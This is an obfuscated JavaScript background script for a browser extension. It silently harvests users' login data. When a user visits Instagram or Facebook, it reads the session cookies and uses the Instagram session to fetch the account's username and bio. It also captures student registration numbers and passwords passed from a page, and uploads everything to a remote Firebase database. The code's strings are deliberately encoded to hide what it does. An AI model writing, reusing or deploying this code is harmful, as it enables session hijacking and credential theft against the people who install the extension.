const a0q = a0b;
function a0b(a, b) {
  const c = a0a();
  return (
    (a0b = function (d, e) {
      d = d - 0x1e2;
      let f = c[d];
      if (a0b["pgYDBQ"] === undefined) {
        var g = function (l) {
          const m =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
          let n = "",
            o = "";
          for (
            let p = 0x0, q, r, s = 0x0;
            (r = l["charAt"](s++));
            ~r && ((q = p % 0x4 ? q * 0x40 + r : r), p++ % 0x4)
              ? (n += String["fromCharCode"](0xff & (q >> ((-0x2 * p) & 0x6))))
              : 0x0
          ) {
            r = m["indexOf"](r);
          }
          for (let t = 0x0, u = n["length"]; t < u; t++) {
            o +=
              "%" +
              ("00" + n["charCodeAt"](t)["toString"](0x10))["slice"](-0x2);
          }
          return decodeURIComponent(o);
        };
        (a0b["YFZXBs"] = g), (a = arguments), (a0b["pgYDBQ"] = !![]);
      }
      const h = c[0x0],
        i = d + h,
        j = a[i];
      return !j ? ((f = a0b["YFZXBs"](f)), (a[i] = f)) : (f = j), f;
    }),
    a0b(a, b)
  );
}
(function (a, b) {
  const p = a0b,
    c = a();
  while (!![]) {
    try {
      const d =
        -parseInt(p(0x236)) / 0x1 +
        parseInt(p(0x1e7)) / 0x2 +
        parseInt(p(0x1ea)) / 0x3 +
        (-parseInt(p(0x206)) / 0x4) * (parseInt(p(0x23c)) / 0x5) +
        parseInt(p(0x1f5)) / 0x6 +
        parseInt(p(0x1f3)) / 0x7 +
        -parseInt(p(0x217)) / 0x8;
      if (d === b) break;
      else c["push"](c["shift"]());
    } catch (e) {
      c["push"](c["shift"]());
    }
  }
})(a0a, 0x215f4),
  console[a0q(0x1eb)](a0q(0x1ee), a0q(0x21e));
import { db } from "./firebase-init.js";
import { collection, addDoc } from "./firebase-firestore.js";
import { isDuplicateData } from "./utils.js";
chrome[a0q(0x211)][a0q(0x1e3)][a0q(0x220)](
  async ({ url: a }) => {
    const r = a0q;
    if (a[r(0x210)](r(0x20f))) handleInstagram();
    else {
      if (a[r(0x210)](r(0x223))) handleFacebook();
    }
  },
  { url: [{ hostSuffix: a0q(0x20f) }, { hostSuffix: a0q(0x223) }] }
);
async function handleInstagram() {
  const s = a0q;
  chrome[s(0x209)][s(0x208)]({ domain: s(0x1fd) }, async (a) => {
    const t = s;
    console[t(0x1eb)](t(0x1f6), t(0x20b));
    const b = a[t(0x225)]((j) => j[t(0x237)] === t(0x22e)),
      c = a[t(0x225)]((j) => j[t(0x237)] === t(0x1f2));
    if (!b || !c) {
      console[t(0x218)](t(0x1e8), t(0x231));
      if (!b) console[t(0x218)](t(0x224), t(0x1f0));
      if (!c) console[t(0x218)](t(0x22f), t(0x1f0));
      return;
    }
    const d = b[t(0x235)],
      e = c[t(0x235)];
    console[t(0x1eb)](t(0x202), t(0x1ec)),
      console[t(0x215)]([
        { name: t(0x22e), value: d },
        { name: t(0x1f2), value: e },
      ]);
    let f = t(0x1e6),
      g = "";
    try {
      console[t(0x1eb)](t(0x1f1), t(0x20d));
      const j = await fetch(t(0x1e2) + e + t(0x204), {
        method: t(0x1fe),
        headers: {
          "User-Agent": t(0x226),
          Cookie: t(0x21b) + d + ";",
          "X-IG-App-ID": t(0x230),
          "Accept-Language": t(0x1f7),
        },
      });
      if (!j["ok"]) {
        console[t(0x239)](
          t(0x232) + j[t(0x1e5)] + "\x20" + j[t(0x214)],
          t(0x22d)
        );
        return;
      }
      const k = await j[t(0x1f4)](),
        l = k[t(0x219)] || {};
      (f = l[t(0x229)] || t(0x1e6)),
        (g = l[t(0x238)] || ""),
        console[t(0x1eb)](t(0x1e4), t(0x227)),
        console[t(0x215)]({ username: f, bio: g });
    } catch (m) {
      console[t(0x239)](t(0x1fa), t(0x22d), m);
      return;
    }
    const h = { sessionId: d, userId: e, username: f, bio: g };
    console[t(0x1eb)](t(0x233), t(0x20d)), console[t(0x215)](h);
    const i = collection(db, t(0x228));
    try {
      if (await isDuplicateData(i, h)) {
        console[t(0x218)](t(0x21f), t(0x1ff));
        return;
      }
    } catch (n) {
      console[t(0x239)](t(0x22b), t(0x22d), n);
      return;
    }
    try {
      await addDoc(i, { ...h, timestamp: new Date() }),
        console[t(0x1eb)](t(0x21d) + f, t(0x201));
    } catch (o) {
      console[t(0x239)](t(0x1ed), t(0x22d), o);
    }
  });
}
async function handleFacebook() {
  const u = a0q;
  chrome[u(0x209)][u(0x208)]({ domain: u(0x23b) }, async (a) => {
    const v = u;
    console[v(0x1eb)](v(0x213), v(0x20b));
    const b = a[v(0x225)]((f) => f[v(0x237)] === v(0x1fc)),
      c = a[v(0x225)]((f) => f[v(0x237)] === "xs");
    if (!b || !c) {
      console[v(0x218)](v(0x20e), v(0x231));
      return;
    }
    const d = { c_user: b[v(0x235)], xs: c[v(0x235)] };
    console[v(0x1eb)](v(0x22a), v(0x1ec)), console[v(0x215)](d);
    const e = collection(db, v(0x203));
    try {
      if (await isDuplicateData(e, d)) {
        console[v(0x218)](v(0x20a), v(0x1ff));
        return;
      }
    } catch (f) {
      console[v(0x239)](v(0x21c), v(0x22d), f);
      return;
    }
    try {
      await addDoc(e, { ...d, timestamp: new Date() }),
        console[v(0x1eb)](v(0x216), v(0x201));
    } catch (g) {
      console[v(0x239)](v(0x200), v(0x22d), g);
    }
  });
}
function a0a() {
  const x = [
    "B25nzxnZywDL",
    "z2v0qwXS",
    "y29VA2LLCW",
    "jwpIM5tVUi8Gw0zcxsbeDxbSAwnHDguGC2vZC2LVBIbKzxrLy3rLzcdIGjqGC2TPChbPBMCGC2f2zq",
    "y29SB3i6igrVzgDLCMjSDwu7igzVBNqTD2vPz2H0oIbIB2XKoYbMB250lxnPEMu6ide0ChG7",
    "jwpINiuGw0Xqvv0Gu3r1zgvUDcbKyxrHihnHDMvKigzVCIbYzwDoBZOG",
    "y29SB3i6igrLzxbZA3LIBhvLoYbMB250lxDLAwDODdOGyM9SzdS",
    "jwpIMQdVUi8Gw0zcxsbnAxnZAw5NihjLCxvPCMvKignVB2TPzxm6ignFDxnLCIbVCIb4CW",
    "Aw5ZDgfNCMfTlMnVBq",
    "Aw5JBhvKzxm",
    "D2vItMf2AwDHDgLVBG",
    "C3r1zgvUDerHDge",
    "jwnBrKjDifn0yxj0Aw5NiezHy2vIB29RihnLC3nPB24GzMv0y2GUlI4",
    "C3rHDhvZvgv4Da",
    "DgfIBgu",
    "jwpWN5QaifTgqL0GrMfJzwjVB2SGC2vZC2LVBIbZyxzLzcbZDwnJzxnZzNvSBhK",
    "odq0mtiWvgjVvMvx",
    "D2fYBG",
    "DxnLCG",
    "jwpIMQdVUi8Gw0Xqvv0Gsw5JB21WBgv0zsbZDhvKzw50igrHDgeGCMvJzwL2zwqSihnRAxbWAw5NihnHDMuU",
    "C2vZC2LVBMLKpq",
    "jwpINyWGw0zcxsbfCNjVCIbKDxjPBMCGzhvWBgLJyxrLignOzwnRoG",
    "jwpWN5QaifTjr10Gu2vZC2LVBIbZyxzLzcbZDwnJzxnZzNvSBhKGzM9Yiea",
    "y29SB3i6igDYzwvUoYbMB250lxDLAwDODdOGyM9SzdS",
    "jwpIM5tVUi8Gw0LhxsbeDxbSAwnHDguGC2vZC2LVBIbKzxrLy3rLzcdIGjqGC2TPChbPBMCGC2f2zq",
    "ywrKtgLZDgvUzxi",
    "C3r1zgvUDf9KyxrH",
    "zgf0yq",
    "zMfJzwjVB2SUy29T",
    "jwmGlsbZzxnZAw9UAwqGy29VA2LLie5pvcbMB3vUza",
    "zMLUza",
    "sw5ZDgfNCMfTidiXos4WlJaUmtiUmte3iefUzhjVAwq",
    "y29SB3i6igXPBwvNCMvLBJSGzM9UDc13zwLNAhq6igjVBgq7",
    "Aw5ZDgfNCMfT",
    "DxnLCM5HBwu",
    "jwnBrKjDienVB2TPzxmGzM91BMq6",
    "jwpINyWGw0LhxsbfCNjVCIbKDxjPBMCGzhvWBgLJyxrLignOzwnRoG",
    "DhLWzq",
    "y29SB3i6ihjLzdSGzM9UDc13zwLNAhq6igjVBgq7",
    "C2vZC2LVBMLK",
    "jwmGlsbKC191C2vYx2LKignVB2TPzsbot1qGzM91BMq",
    "otm2nJe5nZqZmZKYndu5",
    "y29SB3i6ig9Yyw5NztSGzM9UDc13zwLNAhq6igjVBgq7igzVBNqTC2L6ztOGmtnWEdS",
    "jwpINyWGw0LhxsbbueKGCMvZCg9UC2uGzxjYB3i6ieHuvfaG",
    "jwnBsuDDifbYzxbHCMLUzYb0BYbZyxzLigrHDge6",
    "jwpINyWGw0Xqvv0GrxjYB3iGzhvYAw5Nigr1CgXPy2f0zsbJAgvJAZO",
    "DMfSDwu",
    "mtmZotuYvefRyNPs",
    "BMfTzq",
    "yMLVz3jHCgH5",
    "zxjYB3i",
    "jwnBtfbvxsbszwnLAxzLzcbZDhvKzw50igrHDge6",
    "lMzHy2vIB29RlMnVBq",
    "nZC1Dvzhu2rr",
    "Ahr0Chm6lY9PlMLUC3rHz3jHBs5JB20VyxbPl3yXl3vZzxjZlW",
    "B25dB21WBgv0zwq",
    "jwpINiuGw0LhxsbvC2vYigLUzM8GzMv0y2HLzcbZDwnJzxnZzNvSBhK6",
    "C3rHDhvZ",
    "Dw5RBM93BL91C2vY",
    "mZK0mdy0vgjQu3bL",
    "jwpIMQdVUi8Gw0LhxsbnAxnZAw5NihjLCxvPCMvKignVB2TPzxm6",
    "jwpINyWGw0Xqvv0GrMfPBgvKihrVihnHDMuGC3r1zgvUDcbKyxrHoG",
    "mtKYmZKZyuzHsKDs",
    "Bg9N",
    "y29SB3i6igDYzwvUoYbMB250lxDLAwDODdOGyM9SzdSGzM9UDc1ZAxPLoIaXm3b4oW",
    "jwpINyWGw0LhxsbgywLSzwqGDg8GC2f2zsbZzxnZAw9UihrViezPCMvZDg9YztO",
    "jwpWN5QaifnLCNzPy2uGv29YA2vYieXVywrLzcdINiu",
    "CgfZC3DVCMq",
    "y29SB3i6ig9Yyw5NztS",
    "jwnBsuDDiezLDgnOAw5NihvZzxiGAw5MBYbMCM9TieLUC3rHz3jHBsbbueKUlI4",
    "zhnFDxnLCL9Pza",
    "mtyYndq0ogr3qNbkqG",
    "ANnVBG",
    "nZe1odqYzxDcterR",
    "jwnBsuDDifn0yxj0Aw5NieLUC3rHz3jHBsbZzxnZAw9UigzLDgnOlI4U",
    "zw4Tvvm",
    "CMvNAxn0CMf0Aw9UtNvTyMvY",
    "y29SB3i6ig9Yyw5NztSGzM9UDc13zwLNAhq6igjVBgq7",
    "jwpINyWGw0LhxsbfEgnLChrPB24GzhvYAw5NiefqssbMzxrJAdO",
    "jwpIM5tVUi8Gw0Xqvv0GrhvWBgLJyxrLihn0DwrLBNqGzgf0ysbKzxrLy3rLzcdIGjqGC2TPChbPBMCGC2f2zq",
    "y191C2vY",
    "lMLUC3rHz3jHBs5JB20",
    "r0vu",
    "y29SB3i6igDYyxK7igzVBNqTD2vPz2H0oIbIB2XKoW",
    "jwpINyWGw0zcxsbgywLSzwqGDg8GC2f2zsbZzxnZAw9UihrViezPCMvZDg9YztO",
    "y29SB3i6ig1LzgL1BxnLywDYzwvUoYbMB250lxDLAwDODdOGyM9SzdSGzM9UDc1ZAxPLoIaXnhb4oW",
    "jwnBsuDDienVB2TPzxmGzM91BMq6",
    "zMfJzwjVB2S",
    "l2LUzM8V",
    "CNvUDgLTzq",
    "nJeWmhzvCNjuqG",
  ];
  a0a = function () {
    return x;
  };
  return a0a();
}
let lastStudentData = null;
chrome[a0q(0x205)][a0q(0x207)][a0q(0x220)](async (a, b, c) => {
  const w = a0q;
  if (a[w(0x22c)] === w(0x221)) {
    const { registrationNumber: d, password: e } = a[w(0x222)];
    if (!d || !e) {
      console[w(0x218)](w(0x21a), w(0x1f9));
      return;
    }
    if (
      lastStudentData &&
      lastStudentData[w(0x1f8)] === d &&
      lastStudentData[w(0x1ef)] === e
    )
      return;
    (lastStudentData = { registrationNumber: d, password: e }),
      console[w(0x1eb)](w(0x23a), w(0x20b)),
      console[w(0x215)]({ registrationNumber: d, password: e });
    const f = collection(db, w(0x212)),
      g = { registrationNumber: d, password: e };
    try {
      if (await isDuplicateData(f, g)) {
        console[w(0x218)](w(0x1fb), w(0x1ff));
        return;
      }
    } catch (h) {
      console[w(0x239)](w(0x234), w(0x22d), h);
      return;
    }
    try {
      await addDoc(f, { ...g, timestamp: new Date() }),
        console[w(0x1eb)](w(0x20c) + d, w(0x201));
    } catch (i) {
      console[w(0x239)](w(0x1e9), w(0x22d), i);
    }
  }
});
